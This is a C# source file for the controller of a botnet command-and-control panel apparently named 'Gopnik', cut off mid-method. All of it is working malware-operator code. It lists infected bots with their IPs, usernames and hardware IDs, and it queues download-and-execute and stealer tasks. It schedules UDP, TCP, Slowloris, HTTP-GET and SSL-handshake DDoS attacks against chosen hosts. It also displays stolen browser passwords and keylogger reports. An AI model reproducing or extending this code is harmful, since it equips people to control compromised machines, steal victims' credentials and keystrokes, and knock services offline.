using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;

using Controller;
using Controller.Core;
using Controller.Core.Config;
using Controller.Network;
using Controller.Network.Gopnik;
using Controller.Utilities;
using Controller.Forms;
using System.IO;
using System.Data;
using DevExpress.XtraCharts;
using DevExpress.Utils;
using Controller.Network.Protocol;

namespace Controller.Core
{
    class CController
    {
        private frmMain m_frmMain = null;
        private CGopnikClient m_GopnikClient = null;
        private DataTable m_BotlistData, m_TasklistData,
            m_DdosListData, m_StealerListData,
            m_KeyloggerListData, m_BotnetInformationListData = null;
        private DataTable m_Transfer = null;

        LookupService ls = null;

        #region CONSTRUCTOR
        public CController(frmMain formMain)
        {
            m_frmMain = formMain;

            #region INIT_CONFIG_EVENTS
            Program.ControllerConfig.OnChangeCurrentBotPage += ControllerConfig_OnChangeCurrentBotPage;
            Program.ControllerConfig.OnChangeTotalBotPages += ControllerConfig_OnChangeTotalBotPages;
            Program.ControllerConfig.OnChangeTotalBots += ControllerConfig_OnChangeTotalBots;
            Program.ControllerConfig.OnChangeOnlineBots += ControllerConfig_OnChangeOnlineBots;

            Program.ControllerConfig.OnChangeTotalTasks += ControllerConfig_OnChangeTotalTasks;

            Program.ControllerConfig.OnChangeCurrentStealerPage += ControllerConfig_OnChangeCurrentStealerPage;
            Program.ControllerConfig.OnChangeTotalStealerPages += ControllerConfig_OnChangeTotalStealerPages;
            Program.ControllerConfig.OnChangeTotalBrowserStealer += ControllerConfig_OnChangeTotalBrowserStealer;

            Program.ControllerConfig.OnChangeCurrentKeylogPage += ControllerConfig_OnChangeCurrentKeylogPage;
            Program.ControllerConfig.OnChangeTotalKeylogPages += ControllerConfig_OnChangeTotalKeylogPages;
            Program.ControllerConfig.OnChangeTotalKeylog += ControllerConfig_OnChangeTotalKeylog;

            Program.ControllerConfig.OnChangeTotalDdos += ControllerConfig_OnChangeTotalDdos;

            Program.ControllerConfig.OnChangeAVGCPU += ControllerConfig_OnChangeAVGCPU;
            #endregion

            #region INIT_BOTLIST
            m_BotlistData = new DataTable();

            string[] arr_strBotlistColumns = new string[]
            {
                "ID",
                "IP Address(v4)",
                "Version",
                "Operating System",
                "Username",
                "HWID",
                "Latency",
                "Country"
            };

            foreach (string strColumn in arr_strBotlistColumns) m_BotlistData.Columns.Add(strColumn);

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.gcBotlist.DataSource = m_BotlistData;
            });
            #endregion

            #region INIT_TASKLIST
            m_TasklistData = new DataTable();

            string[] arr_strTasklistColumns = new string[]
            {
                "ID", "Task", "Parameters", "Executes", "Executed", "Successful", "Delete"
            };

            foreach (string strTasklistColum in arr_strTasklistColumns)
            {
                m_TasklistData.Columns.Add(strTasklistColum);
            }

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.gcTasklist.DataSource = m_TasklistData;
            });
            #endregion

            #region INIT_DDOSLIST
            m_DdosListData = new DataTable();

            string[] arr_strDdosListColumns = new string[]
            {
                "ID", "Type", "Host", "Port", "PPS", "Rate", "Active", "Status", "Start Time", "End Time", "Time Left", "Sockets", "Interval", "Stop"
            };

            foreach (string strDdosListColumn in arr_strDdosListColumns) m_DdosListData.Columns.Add(strDdosListColumn);

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.gcDdosList.DataSource = m_DdosListData;
            });
            #endregion

            #region INIT_STEALERLIST
            m_StealerListData = new DataTable();

            string[] arr_strStealerListColumns = new string[]
            {
                "Browser", "URL", "Username", "Password"
            };

            foreach (string strStealerListColumn in arr_strStealerListColumns) m_StealerListData.Columns.Add(strStealerListColumn);

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.gcStealerList.DataSource = m_StealerListData;
            });
            #endregion

            #region INIT_KEYLOGGERLIST
            m_KeyloggerListData = new DataTable();

            string[] arr_strKeyloggerListColumns = new string[]
            {
                "ID", "Window title", "Reports", "Length", "Username", "Bot ID", "View"
            };

            foreach (string strKeyloggerListColumn in arr_strKeyloggerListColumns) m_KeyloggerListData.Columns.Add(strKeyloggerListColumn);

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.gcKeyloggerList.DataSource = m_KeyloggerListData;
            });
            #endregion

            #region INIT_BOTNETINFORMATION
            m_BotnetInformationListData = new DataTable();

            string[] arr_strBotnetInformationColumns = new string[]
            {
                "Name", "Value"
            };

            foreach (string strBotnetInformationColumn in arr_strBotnetInformationColumns) m_BotnetInformationListData.Columns.Add(strBotnetInformationColumn);

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.gcBotnetInformation.DataSource = m_BotnetInformationListData;
            });

            string[] arr_strInformation = new string[]
            {
                "Botnet name", "Avg. CPU Usage", "Results per page", "Total Bots", "Online Bots",
                "Total Tasks", "Total DDoS", "Total Stealer", "Total Keylogger"
            };

            foreach(string strInformation in arr_strInformation)
            {
                DataRow InfoRow = m_BotnetInformationListData.NewRow();
                InfoRow[0] = strInformation;
                InfoRow[1] = "N/A";

                m_BotnetInformationListData.Rows.Add(InfoRow);
            }
            #endregion

            #region INIT_TRANSFER
            m_Transfer = new DataTable();

            string[] arr_strTransferColumns = new string[]
            {
                "Packet ID", "Packet", "Blocks", "Blocks received", "Status"
            };

            foreach (string strColumn in arr_strTransferColumns) m_Transfer.Columns.Add(strColumn);

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.gcTransfer.DataSource = m_Transfer;
            });
            #endregion
        }

        #endregion

        void ControllerConfig_OnChangeAVGCPU(int iAVGCPU)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                CUtils.ReplaceRowCellValue(m_frmMain.gvStatistics, "Avg. CPU Usage", "Value", string.Format("{0}%", iAVGCPU));
            });
        }

        void ControllerConfig_OnChangeTotalDdos(int iTotalDdos)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                CUtils.ReplaceRowCellValue(m_frmMain.gvStatistics, "Total DDoS", "Value", iTotalDdos.ToString());
            });
        }

        void ControllerConfig_OnChangeTotalKeylog(int iTotalKeylog)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                CUtils.ReplaceRowCellValue(m_frmMain.gvStatistics, "Total Keylogger", "Value", iTotalKeylog.ToString());
            });
        }

        void ControllerConfig_OnChangeTotalBrowserStealer(int iTotalBrowserStealer)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                CUtils.ReplaceRowCellValue(m_frmMain.gvStatistics, "Total Stealer", "Value", iTotalBrowserStealer.ToString());
            });
        }

        void ControllerConfig_OnChangeTotalTasks(int iTotalTasks)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                CUtils.ReplaceRowCellValue(m_frmMain.gvStatistics, "Total Tasks", "Value", iTotalTasks.ToString());
            });
        }

        void ControllerConfig_OnChangeOnlineBots(int iOnlineBots)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                CUtils.ReplaceRowCellValue(m_frmMain.gvStatistics, "Online Bots", "Value", iOnlineBots.ToString());

                m_frmMain.ccBotsonline.Series.Clear();

                Series series1 = new Series("Bots statistics", ViewType.Doughnut3D);
                series1.Points.Add(new SeriesPoint("Total Bots", Program.ControllerConfig.TotalBots));
                series1.Points.Add(new SeriesPoint("Online Bots", iOnlineBots));
                series1.Label.PointOptions.PointView = PointView.ArgumentAndValues;
                ((PiePointOptions)series1.Label.PointOptions).PercentOptions.ValueAsPercent = false;
                series1.Label.PointOptions.ValueNumericOptions.Format = NumericFormat.Number;
                series1.Label.PointOptions.ValueNumericOptions.Precision = 0;
                series1.ShowInLegend = false;
                m_frmMain.ccBotsonline.Series.Add(series1);
                //m_frmMain.tpBotlist.Text = CUtils.SetOnlineBots(m_frmMain.tpBotlist.Text, iOnlineBots);
            });
        }

        void ControllerConfig_OnChangeTotalBots(int iTotalBots)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                CUtils.ReplaceRowCellValue(m_frmMain.gvStatistics, "Total Bots", "Value", iTotalBots.ToString());
            });
        }

        void ControllerConfig_OnChangeCurrentKeylogPage(int iCurrentKeylogPage)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.lblCurrentKeyloggerPage.Text = CUtils.SetCurrentPage(m_frmMain.lblCurrentKeyloggerPage.Text, iCurrentKeylogPage);
                m_frmMain.btnNextKeyloggerPage.Enabled = iCurrentKeylogPage < Program.ControllerConfig.TotalKeylogPages;
                m_frmMain.btnPreviousKeyloggerPage.Enabled = iCurrentKeylogPage == Program.ControllerConfig.TotalKeylogPages && iCurrentKeylogPage > 1;
            });
        }

        void ControllerConfig_OnChangeTotalKeylogPages(int iTotalKeylogPages)
        {
            if (Program.ControllerConfig.CurrentKeylogPage > iTotalKeylogPages)
            {
                Program.ControllerConfig.CurrentKeylogPage = iTotalKeylogPages;

                if (Program.ControllerConfig.CurrentKeylogPage > 0)
                    this.GetKeyloggerList(Program.ControllerConfig.CurrentKeylogPage);

                m_frmMain.lblCurrentKeyloggerPage.Text = CUtils.SetCurrentPage(m_frmMain.lblCurrentKeyloggerPage.Text, Program.ControllerConfig.CurrentKeylogPage);
            }

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.lblCurrentKeyloggerPage.Text = CUtils.SetTotalPages(m_frmMain.lblCurrentKeyloggerPage.Text, iTotalKeylogPages);

                m_frmMain.btnNextKeyloggerPage.Enabled = Program.ControllerConfig.CurrentKeylogPage < iTotalKeylogPages;
                m_frmMain.btnPreviousKeyloggerPage.Enabled = Program.ControllerConfig.CurrentKeylogPage == iTotalKeylogPages && Program.ControllerConfig.CurrentKeylogPage > 1;
            });
        }

        void ControllerConfig_OnChangeTotalStealerPages(int iTotalStealerPages)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.lblCurrentStealerPage.Text = CUtils.SetTotalPages(m_frmMain.lblCurrentStealerPage.Text, iTotalStealerPages);

                m_frmMain.btnNextStealerPage.Enabled = Program.ControllerConfig.CurrentStealerPage < iTotalStealerPages;
                m_frmMain.btnPreviousStealerPage.Enabled = Program.ControllerConfig.CurrentStealerPage == iTotalStealerPages && Program.ControllerConfig.CurrentStealerPage > 1;
            });
        }

        void ControllerConfig_OnChangeCurrentStealerPage(int iCurrentStealerPage)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.lblCurrentStealerPage.Text = CUtils.SetCurrentPage(m_frmMain.lblCurrentStealerPage.Text, iCurrentStealerPage);
                m_frmMain.btnNextStealerPage.Enabled = iCurrentStealerPage < Program.ControllerConfig.TotalStealerPages;
                m_frmMain.btnPreviousStealerPage.Enabled = iCurrentStealerPage == Program.ControllerConfig.TotalStealerPages && iCurrentStealerPage > 1;
            });
        }

        void ControllerConfig_OnChangeTotalBotPages(int iTotalBotPages)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                if (iTotalBotPages == 0) Program.ControllerConfig.CurrentBotPage = 0;

                m_frmMain.lblCurrentBotPage.Text = CUtils.SetTotalPages(m_frmMain.lblCurrentBotPage.Text, iTotalBotPages);

                m_frmMain.btnNextBotlistPage.Enabled = Program.ControllerConfig.CurrentBotPage < iTotalBotPages;
                m_frmMain.btnPreviousBotlistPage.Enabled = Program.ControllerConfig.CurrentBotPage == iTotalBotPages && Program.ControllerConfig.CurrentBotPage > 1;
            });
        }

        void ControllerConfig_OnChangeCurrentBotPage(int iCurrentBotPage)
        {
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                if (iCurrentBotPage == 0) this.CleanBotlist();

                m_frmMain.lblCurrentBotPage.Text = CUtils.SetCurrentPage(m_frmMain.lblCurrentBotPage.Text, iCurrentBotPage);
                m_frmMain.btnNextBotlistPage.Enabled = iCurrentBotPage < Program.ControllerConfig.TotalBotPages;
                m_frmMain.btnPreviousBotlistPage.Enabled = iCurrentBotPage == Program.ControllerConfig.TotalBotPages && iCurrentBotPage > 1;
            });
        }

        #region ON_LOGIN_EVENT_HANDLER
        void m_GopnikClient_OnLogin(string strBotnetname)
        {
            //Sychronize GUI with Botnet-name information
            this.SetBotnetname(strBotnetname);
            this.SetStatus("Authorized.");
            this.EnableControls(true);
        }
        #endregion

        #region DESTRUCTOR
        ~CController()
        {

        }
        #endregion

        #region ON_DDOS_LIST_EVENT_HANDLER
        void HandleOnDdosList(string[] arr_strDdoslist)
        {
            if (m_frmMain == null || !m_GopnikClient.IsRunning()) return;

            /*
             * [0] = ID
             * [1] = Type
             * [2] = Host
             * [3] = Port
             * [4] = PPS
             * [5] = Rate
             * [6] = Active Bots
             * [7] = Status
             * [8] = Start Date
             * [9] = End Date
             * [10] = Time left
             */

            m_frmMain.Invoke((MethodInvoker)delegate()
                             {
                                 this.CleanDdoslist();
                             });

            if (arr_strDdoslist != null)
            {
                foreach (var strDdos in arr_strDdoslist)
                {
                    var arr_strData = strDdos.Split('*');

                    if (arr_strData.Length != 13) continue;

                    m_frmMain.Invoke((MethodInvoker)delegate()
                                     {
                                         DataRow DdosRow = m_DdosListData.NewRow();
                                         
                                         arr_strData[6] += " Bots";

                                         switch (arr_strData[1])
                                         {
                                             case "0":
                                                 arr_strData[1] = "UDP";
                                                 break;
                                             case "1":
                                                 arr_strData[1] = "TCP";
                                                 break;
                                             case "2":
                                                 arr_strData[1] = "Slowpost";
                                                 break;
                                             case "3":
                                                 arr_strData[1] = "Slowloris";
                                                 break;
                                             case "4":
                                                 arr_strData[1] = "HTTP-GET";
                                                 break;
                                             case "5":
                                                 arr_strData[1] = "SSL-Handshake";
                                                 break;
                                             default: break;
                                         }

                                         int i = 0;
                                         for (i = 0; i < arr_strData.Length; i++)
                                             DdosRow[i]= arr_strData[i];
                                         DdosRow[i++] = "Stop";

                                         m_DdosListData.Rows.Add(DdosRow);
                                     });
                }
            }
        }
        #endregion

        #region ON_TOTAL_DDOS_EVENT_HANDLER
        void HandleOnTotalDdos(int iTotalDdos)
		{
			if(m_frmMain == null || !m_GopnikClient.IsRunning())
				return;
		
            Program.ControllerConfig.TotalDdos = iTotalDdos;
		}
        #endregion

        #region START_CLIENT
        public Boolean Start()
        {
            try
            {
                if (File.Exists("GeoIP.dat")) ls = new LookupService("GeoIP.dat", LookupService.GEOIP_MEMORY_CACHE);

                m_GopnikClient = new CGopnikClient();

                m_GopnikClient.OnConnected += m_GopnikClient_OnConnected;
                m_GopnikClient.OnDisconnect += m_GopnikClient_OnDisconnect;
                m_GopnikClient.OnLogin += m_GopnikClient_OnLogin;
                m_GopnikClient.OnResultsPerPage += delegate()
				{
                	if(m_frmMain == null) return;
                	
                	if(!m_GopnikClient.IsRunning()) return;
                	
                	m_frmMain.Invoke((MethodInvoker)delegate()
                	                 {
                                         CUtils.ReplaceRowCellValue(m_frmMain.gvStatistics, "Results per page", "Value", Program.ControllerConfig.ResultsPerPage);
                	                 });
                };
                //Botlist
                m_GopnikClient.OnTotalBots += m_GopnikClient_OnTotalBots;
                m_GopnikClient.OnBots += m_GopnikClient_OnBots;

                //Main Tasks
                m_GopnikClient.OnMainTasks += m_GopnikClient_OnMainTasks;
                m_GopnikClient.OnTotalMainTasks += m_GopnikClient_OnTotalMainTasks;
                m_GopnikClient.OnMainTaskRemoved += m_GopnikClient_OnMainTaskRemoved;
                
                //Ddos list
                m_GopnikClient.OnDdosList += HandleOnDdosList;
                m_GopnikClient.OnTotalDdos += HandleOnTotalDdos;

                //Browser-Stealer Reports
                m_GopnikClient.OnBrowserStealer += m_GopnikClient_OnBrowserStealer;
                
                //Keylogger Reports
                m_GopnikClient.OnTotalKeylogReports += m_GopnikClient_OnTotalKeylogReports;
                m_GopnikClient.OnKeylogReports += m_GopnikClient_OnKeylogReports;
                m_GopnikClient.OnKeylogReport += m_GopnikClient_OnKeylogReport;
                m_GopnikClient.OnKeylogReportRemoved += m_GopnikClient_OnKeylogReportRemoved;

                //Logs
                m_GopnikClient.OnControllerLog += m_GopnikClient_OnControllerLog;

                //Statistics
                m_GopnikClient.OnOSStatistics += m_GopnikClient_OnOSStatistics;
                m_GopnikClient.OnCountryStatistics += m_GopnikClient_OnCountryStatistics;
                //Transfer
                m_GopnikClient.OnHeaderReceived += delegate(CPacketHeader Header)
                {
                    DataRow Row = m_Transfer.NewRow();
                    Row[0] = Header.Packet_Ident;
                    Row[1] = (MASTER_PACKET)Header.Packet;
                    Row[2] = Header.Block_Amount;
                    Row[3] = "0";
                    Row[4] = "Receiving";

                    m_frmMain.Invoke((MethodInvoker)delegate()
                    {
                        m_Transfer.Rows.Add(Row);
                    });
                };

                m_GopnikClient.OnPacketReceived += delegate(CPacket Packet)
                {
                    foreach(DataRow Row in m_Transfer.Rows)
                    {
                        string strPacketID = Row[0].ToString();

                        if(strPacketID == Packet.PacketHeader.Packet_Ident)
                        {
                            m_frmMain.Invoke((MethodInvoker)delegate()
                            {
                                m_Transfer.Rows.Remove(Row);
                            });
                            break;
                        }
                    }
                };

                m_GopnikClient.OnBlockReceived += delegate(string strPacketID)
                {
                    foreach(DataRow Row in m_Transfer.Rows)
                    {
                        if (Row[0].ToString() != strPacketID)
                            continue;

                        int iReceived = -1;

                        if (!int.TryParse(Row[3].ToString(), out iReceived)) break;

                        iReceived++;

                        m_frmMain.Invoke((MethodInvoker)delegate()
                        {
                            CUtils.ReplaceRowCellValue(m_frmMain.gvTransfer, strPacketID, "Blocks received", iReceived);
                        });
                    }
                };

                if (m_GopnikClient != null) m_GopnikClient.Start();

                return true;
            }
            catch { }
            return false;
        }

        void m_GopnikClient_OnCountryStatistics(string[] arr_strCountryInfo)
        {
            if (m_frmMain == null || !m_GopnikClient.IsRunning()) return;

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.ccCountry.Series.Clear();

                Series series1 = new Series("Country", ViewType.Doughnut3D);

                foreach (string strCountryData in arr_strCountryInfo)
                {
                    string[] arr_strData = strCountryData.Split('*');

                    if (arr_strData.Length != 2) continue;

                    /*
                     * arr_strData[0] = Country
                     * arr_strData[1] = Count
                     */

                    int iCount = -1;

                    if (!int.TryParse(arr_strData[1], out iCount)) continue;

                    series1.Points.Add(new SeriesPoint(arr_strData[0], iCount));
                }
                series1.Label.PointOptions.PointView = PointView.ArgumentAndValues;
                ((PiePointOptions)series1.Label.PointOptions).PercentOptions.ValueAsPercent = false;
                series1.Label.PointOptions.ValueNumericOptions.Format = NumericFormat.Number;
                series1.Label.PointOptions.ValueNumericOptions.Precision = 0;
                series1.ShowInLegend = false;
                m_frmMain.ccCountry.Series.Add(series1);
            });
        }
        #endregion

        #region OS_STATISTICS
        void m_GopnikClient_OnOSStatistics(string[] arr_strOSInfo)
        {
            if (m_frmMain == null || !m_GopnikClient.IsRunning()) return;

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.ccOperatingSystem.Series.Clear();

                Series series1 = new Series("Operating System", ViewType.Doughnut3D);

                foreach(string strOSData in arr_strOSInfo)
                {
                    string[] arr_strData = strOSData.Split('*');

                    if (arr_strData.Length != 2) continue;

                    /*
                     * arr_strData[0] = Operating System
                     * arr_strData[1] = Count
                     */

                    int iCount = -1;

                    if (!int.TryParse(arr_strData[1], out iCount)) continue;

                    series1.Points.Add(new SeriesPoint(arr_strData[0], iCount));
                }
                series1.Label.PointOptions.PointView = PointView.ArgumentAndValues;
                ((PiePointOptions)series1.Label.PointOptions).PercentOptions.ValueAsPercent = false;
                series1.Label.PointOptions.ValueNumericOptions.Format = NumericFormat.Number;
                series1.Label.PointOptions.ValueNumericOptions.Precision = 0;
                series1.ShowInLegend = false;
                m_frmMain.ccOperatingSystem.Series.Add(series1);
            });
        }
        #endregion

        void m_GopnikClient_OnKeylogReportRemoved(int iReportID)
        {
            if (m_frmMain == null || !m_GopnikClient.IsRunning()) return;

            try
            {
                m_frmMain.Invoke((MethodInvoker)delegate()
                {
                    foreach(DataRow Row in m_KeyloggerListData.Rows)
                    {
                        int iCurrentID = -1;

                        if (!int.TryParse(Row[0].ToString(), out iCurrentID) ||
                            iReportID != iCurrentID) continue;

                        m_KeyloggerListData.Rows.Remove(Row);
                        break;
                    }
                });
            }
            catch { }
        }

        #region KEYLOG_REPORT_VIEWER
        void m_GopnikClient_OnKeylogReport(string[] arr_strReportData)
        {
            if (!m_GopnikClient.IsRunning() || m_frmMain == null) return;

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                CKeylogReport ReportForm = new CKeylogReport();
                ReportForm.OnDeleteReport += ReportForm_OnDeleteReport;
                ReportForm.Show();
                ReportForm.OnReportDataInvoke(arr_strReportData[0], arr_strReportData[1], arr_strReportData[3], arr_strReportData[4]);
                ReportForm.OnBotDataInvoke(arr_strReportData[2], arr_strReportData[5], arr_strReportData[6], arr_strReportData[7], arr_strReportData[8]);
            });
        }

        void ReportForm_OnDeleteReport(int iReportID)
        {
            if (!m_GopnikClient.IsRunning()) return;

            try
            {
                new Thread(delegate()
                    {
                        m_GopnikClient.RemoveKeylogReport(iReportID);
                    }).Start();
            }
            catch { }
        }
        #endregion

        #region ON_KEYLOGGER_REPORT_LIST_EVENT_HANDLER
        void m_GopnikClient_OnKeylogReports(string[] arr_strKeylogReports, int iPage)
        {
            if (m_frmMain == null || !m_GopnikClient.IsRunning()) return;

            try
            {
                m_frmMain.Invoke((MethodInvoker)delegate()
                {
                    this.CleanKeylogReports();
                });

                foreach (string strRow in arr_strKeylogReports)
                {
                    var arr_strData = strRow.Split('*');

                    if (arr_strData.Length != 6) continue;

                    m_frmMain.Invoke((MethodInvoker)delegate()
                    {
                        //int iRowIndex = m_frmMain.dgvKeylogs.Rows.Add();
                        DataRow KeylogRow = m_KeyloggerListData.NewRow();

                        int i;
                        for (i = 0; i < arr_strData.Length; i++)
                        {
                            if(i == 1)
                            {
                                arr_strData[i] = UnicodeEncoding.Unicode.GetString(Convert.FromBase64String(arr_strData[i]));
                            }
                            KeylogRow[i] = arr_strData[i];
                        }
                        KeylogRow[i++] = "View";

                        m_KeyloggerListData.Rows.Add(KeylogRow);
                    });
                }

                Program.ControllerConfig.CurrentKeylogPage = iPage;
            }
            catch { }
        }
        #endregion

        #region TOTAL_KEYLOG_REPORTS_EVENT_HANDLER
        void m_GopnikClient_OnTotalKeylogReports(int iTotalKeylogReports)
        {
            if (!m_GopnikClient.IsRunning() || m_frmMain == null) return;

            try
            {
              
            }
            catch { }
        }
        #endregion

        #region BROWSER_STEALER_EVENT_HANDLER
        void m_GopnikClient_OnBrowserStealer(string[] arr_strData, int iPage)
        {
            if (!m_GopnikClient.IsRunning() || m_frmMain == null) return;

            try
            {
                m_frmMain.Invoke((MethodInvoker)delegate()
                {
                    this.CleanBrowserStealer();
                });

                foreach (String strRow in arr_strData)
                {
                    var arr_strRowData = strRow.Split('*');

                    if (arr_strRowData.Length != 4) continue;

                    m_frmMain.Invoke((MethodInvoker)delegate()
                    {
                        DataRow StealerRow = m_StealerListData.NewRow();
                        //int iRowIndex = m_frmMain.dgvBrowserStealer.Rows.Add();
                        int i;
                        for (i = 0; i < arr_strRowData.Length; i++)
                        {
                            StealerRow[i] = arr_strRowData[i];
                        }

                        m_StealerListData.Rows.Add(StealerRow);
                    });
                }

                Program.ControllerConfig.CurrentStealerPage = iPage;
            }
            catch { }
        }
        #endregion

        #region TASK_REMOVED_EVENT_HANDLER
        void m_GopnikClient_OnMainTaskRemoved(int iTaskID)
        {
            try
            {
                if (!m_GopnikClient.IsRunning() || m_frmMain == null) return;

                m_frmMain.Invoke((MethodInvoker)delegate()
                {
                   
                    foreach(DataRow row in m_TasklistData.Rows)
                    {
                        int iID = -1;

                        if(int.TryParse(row[0].ToString(), out iID))
                        {
                            if (iID == iTaskID)
                            {
                                m_TasklistData.Rows.Remove(row);
                                break;
                            }
                        }
                    }
                });
            }
            catch { }
        }
        #endregion

        #region TASKLIST_EVENT_HANDLER
        void m_GopnikClient_OnMainTasks(string[] arr_strTasks)
        {
            try
            {
                if (!m_GopnikClient.IsRunning() || m_frmMain == null) return;

                m_frmMain.Invoke((MethodInvoker)delegate()
                {
                    this.CleanTasklist();  
                });

                foreach(String strTask in arr_strTasks)
                {
                    String[] arr_strData = strTask.Split('*');

                    if (arr_strData.Length != 6)
                        continue;

                    Int32 iTask = -1;

                    if (!Int32.TryParse(arr_strData[1], out iTask))
                        continue;

                    m_frmMain.Invoke((MethodInvoker)delegate()
                    {
                        String strTaskString = String.Empty;

                        switch (iTask)
                        {
                            case 0:
                                strTaskString = "Download-Execute";
                                break;
                            case 1:
                                strTaskString = "Update";
                                break;
                            case 2:
                                strTaskString = "Uninstall";
                                break;
                            case 3:
                                strTaskString = "Stealer";
                                break;
                            default: break;
                        }

                        if (String.IsNullOrEmpty(strTaskString)) return;

                        DataRow TaskRow = m_TasklistData.NewRow();

                        int i;
                        for(i = 0; i < arr_strData.Length; i++)
                        {
                            if (i == 1) arr_strData[1] = strTaskString;

                            TaskRow[i] = arr_strData[i];
                        }

                        TaskRow[i++] = "Delete";

                        m_TasklistData.Rows.Add(TaskRow);
                    });
                }
            }
            catch { }
            
        }
        #endregion

        #region ON_LOG_EVENT_HANDLER
        void m_GopnikClient_OnControllerLog(string strData)
        {
        	if (!m_GopnikClient.IsRunning() || m_frmMain == null) return;
            
            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                m_frmMain.lbLogs.Items.Add(strData);
            });
        }
        #endregion

        #region ON_TOTAL_TASKS_EVENT_HANDLER
        void m_GopnikClient_OnTotalMainTasks(int iTotalMainTasks)
        {
            try
            {
                if (!m_GopnikClient.IsRunning() || m_frmMain == null) return;

                Program.ControllerConfig.TotalTasks = iTotalMainTasks;
            }
            catch { }
        }
        #endregion

        #region ON_BOTLIST_EVENT_HANDLER
        void m_GopnikClient_OnBots(string[] arr_strBots, Int32 iPage)
        {
            if (!m_GopnikClient.IsRunning() || m_frmMain == null) return;

            m_frmMain.Invoke((MethodInvoker)delegate()
            {
                this.CleanBotlist();
            });

            foreach (String strBot in arr_strBots)
            {
                String[] arr_strBotData = strBot.Split('*');

                if (arr_strBotData.Length != 8)
                {
                    continue;
                }
                /*
                 * [0] = ID
                 * [1] = IPv4
                 * [2] = Version
                 * [3] = OS
                 * [4] = Username
                 * [5] = HWID
                 * [6] = Latency
                 * [7] = Is Online(0/1)
                 */


                m_frmMain.Invoke((MethodInvoker)delegate()
                {
                  	int iOnline = -1;
                    
                    if(!int.TryParse(arr_strBotData[7], out iOnline)) return;

                    /*int iRowIndex = m_frmMain.dgvBots.Rows.Add();

                    m_frmMain.dgvBots.Rows[iRowIndex].DefaultCellStyle.ForeColor = iOnline == 1 ? Color.Green : Color.Red;

                    int i = 0;
                    for (i = 0; i < arr_strBotData.Length - 1; i++)
                        m_frmMain.dgvBots.Rows[iRowIndex].Cells[i].Value = arr_strBotData[i];
                    if (this.ls != null)
                    {
                        m_frmMain.dgvBots.Rows[iRowIndex].Cells[i++].Value = ls.getCountry(arr_strBotData[1]).getName();
                    }
                    else m_frmMain.dgvBots.Rows[iRowIndex].Cells[i++].Value = "N/A";*/

                    string strCountry = "N/A";

                    if (this.ls != null) strCountry = ls.getCountry(arr_strBotData[1]).getName();

                    DataRow botRow = m_BotlistData.NewRow();

                    int i;
                    for (i = 0; i < arr_strBotData.Length - 1; i++)
                        botRow[i] = arr_strBotData[i];

                    botRow[i++] = strCountry;

                    m_BotlistData.Rows.Add(botRow);

                });
            }
        }
        #endregion

        #region ON_TOTAL_BOTS_EVENT_HANDLER
        void m_GopnikClient_OnTotalBots(Int32 iTotalBots, Int32 iOnlineBots)
        {
            if (!this.m_GopnikClient.IsRunning()) return;

            Program.ControllerConfig.TotalBots = iTotalBots;
            Program.ControllerConfig.OnlineTotal = iOnlineBots;
        }
        #endregion

        #region STOP_CLIENT
        public void Stop()
        {
            if (m_GopnikClient != null) m_GopnikClient.Stop();
        }
        #endregion

        #region ON_DISCONNECTED_EVENT_HANDLER
        void m_GopnikClient_OnDisconnect()
        {
            this.EnableControls(false);
            this.SetStatus("Connection lost.");
        }
        #endregion

        #region ON_CONNECTED_EVENT_HANDLER
        void m_GopnikClient_OnConnected()
        {
            this.SetStatus("Connection initialized.");
        }
        #endregion

        #region GET_BOTLIST
        public void GetBots(Int32 iPage)
        {
            new Thread(delegate()
            {
                if (!m_GopnikClient.GetBotlist(iPage))
                    this.SetStatus("Failed to get Botlist.");
            }).Start();
        }
        #endregion

        #region GET_TASK_LIST
        public void GetMainTasks(Int32 iPage)
        {
            new Thread(delegate()
                {
                    if (!m_GopnikClient.GetTasklist(iPage))
                        this.SetStatus("Failed to get Main Tasklist.");
                }).Start();
        }
        #endregion

        #region ADD_TASK
        public void AddTask(String strTask, String strParameters, Int32 iExecutes)
        {
            try
            {
                Int16 iTask = -1;

                switch (strTask)
                {
                    case "Download-Execute":
                        iTask = 0;
                        break;
                    case "Update":
                        iTask = 1;
                        break;
                    case "Uninstall":
                        iTask = 2;
                        break;
                    case "Stealer":
                        iTask = 3;
                        break;
                    default: break;
                }

                if(iTask == -1)
                {
                    this.SetStatus("Failed to add task.");
                    return;
                }

                new Thread(delegate()
                    {
                        if (!m_GopnikClient.AddTask(iTask, strParameters, iExecutes))
                            this.SetStatus("Failed to add task.");
                    }).Start();
            }
            catch
            {
            	
            }
        }
        #endregion

        #region REMOVE_TASK
        public void RemoveTask(Int32 iTaskID)
        {
            try
            {
				new Thread(() => m_GopnikClient.RemoveTask(iTaskID)).Start();
            }
            catch
            {
            	
            }
        }
        #endregion

        #region GET_DDOS_LIST
        public void GetDdoslist()
        {
            try
            {
				new Thread(() => m_GopnikClient.GetDdosList()).Start();
            }
            catch { }
        }
        #endregion

        #region ADD_DDOS
        public void AddDdos(string strArguments)
        {
        	try
        	{
